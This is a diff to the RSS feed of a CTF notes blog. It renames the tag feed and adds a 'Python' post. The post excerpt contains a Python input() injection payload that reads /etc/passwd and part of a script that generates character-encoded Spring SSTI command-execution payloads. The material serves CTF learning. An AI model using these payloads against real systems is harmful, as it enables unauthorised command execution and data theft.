@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Linux on 53CTF</title>
-    <link>https://53ctf.github.io/tags/linux/</link>
-    <description>Recent content in Linux on 53CTF</description>
+    <title>Notes on 53CTF</title>
+    <link>https://53ctf.github.io/tags/notes/</link>
+    <description>Recent content in Notes on 53CTF</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 08 Jan 2023 09:59:08 +0530</lastBuildDate><atom:link href="https://53ctf.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 08 Jan 2023 09:59:08 +0530</lastBuildDate><atom:link href="https://53ctf.github.io/tags/notes/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Dotfiles &amp; Bash Scripts</title>
       <link>https://53ctf.github.io/posts/notes/dotfiles/</link>
@@ -13,6 +13,18 @@
       
       <guid>https://53ctf.github.io/posts/notes/dotfiles/</guid>
       <description>alacritty.yml env: TERM: alacritty window: padding: x: 5 y: 5 opacity: 0.60 title: Alacritty dynamic_title: true class: instance: Alacritty general: Alacritty scrolling: history: 10000 multiplier: 3 font: normal: family: Ubuntu Mono style: Regular bold: family: Ubuntu Mono style: Bold italic: family: Ubuntu Mono style: Italic bold_italic: family: Ubuntu Mono style: Bold Italic size: 11.0 colors: primary: background: &amp;#39;#2d333b&amp;#39; foreground: &amp;#39;#adbac7&amp;#39; normal: black: &amp;#39;#2d333b&amp;#39; red: &amp;#39;#f47067&amp;#39; green: &amp;#39;#8ddb8c&amp;#39; yellow: &amp;#39;#f69d50&amp;#39; blue: &amp;#39;#6cb6ff&amp;#39; magenta: &amp;#39;#dcbdfb&amp;#39; cyan: &amp;#39;#96d0ff&amp;#39; white: &amp;#39;#adbac7&amp;#39; bright: black: &amp;#39;#768390&amp;#39; red: &amp;#39;#f47067&amp;#39; green: &amp;#39;#8ddb8c&amp;#39; yellow: &amp;#39;#f69d50&amp;#39; blue: &amp;#39;#6cb6ff&amp;#39; magenta: &amp;#39;#dcbdfb&amp;#39; cyan: &amp;#39;#96d0ff&amp;#39; white: &amp;#39;#adbac7&amp;#39; draw_bold_text_with_bright_colors: false selection: semantic_escape_chars: &amp;#34;,│`|:\&amp;#34;&amp;#39; ()[]{}&amp;lt;&amp;gt;\t&amp;#34; cursor: style: shape: Block blinking: Off vi_mode_style: None live_config_reload: true shell: program: /bin/bash args: - --login working_directory: None Portscan.</description>
+    </item>
+    
+    <item>
+      <title>Python</title>
+      <link>https://53ctf.github.io/posts/notes/python/</link>
+      <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
+      
+      <guid>https://53ctf.github.io/posts/notes/python/</guid>
+      <description>Take Advantage Of input() Function And Run System Commands Within It
+__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
+GitHub Source
+#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
     </item>
     
     <item>
